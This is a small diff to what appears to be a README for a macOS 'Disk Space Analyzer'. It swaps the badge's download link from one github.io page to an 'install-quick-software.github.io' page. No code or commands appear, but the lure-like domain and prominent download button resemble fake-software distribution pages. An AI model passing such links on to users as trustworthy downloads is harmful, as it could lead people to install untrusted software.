@@ -7,7 +7,7 @@
 <br>  
 
 <div align="center">  
-<a href="https://osx-app.github.io/.github/disc-space-analyzer">  
+<a href="https://install-quick-software.github.io/.github/disc-space-analyzer">  
 <img src="https://img.shields.io/badge/💻_GET_Disk_Space_Analyzer-indigo?style=for-the-badge&logo=apple" alt="GET Disk Space Analyzer">  
 </a>  
 </div>
